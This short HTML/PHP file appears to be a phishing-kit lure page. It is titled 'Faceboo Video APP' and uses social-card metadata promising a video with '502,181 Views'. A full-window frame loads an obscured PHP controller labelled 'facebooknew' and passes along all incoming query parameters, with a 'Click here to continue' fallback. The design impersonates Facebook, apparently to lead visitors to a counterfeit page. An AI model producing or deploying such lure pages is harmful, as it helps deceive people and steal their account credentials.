
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="502,181 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLER6c89f71d-32a8-47ae-afed-48b30a0be5e4.php?source=.%2Fpublic%2FACCESSS573c3354-e0d2-49ed-a9b9-9182c325c72e&lan=facebooknew&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLER6c89f71d-32a8-47ae-afed-48b30a0be5e4.php?source=.%2Fpublic%2FACCESSS573c3354-e0d2-49ed-a9b9-9182c325c72e&lan=facebooknew&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   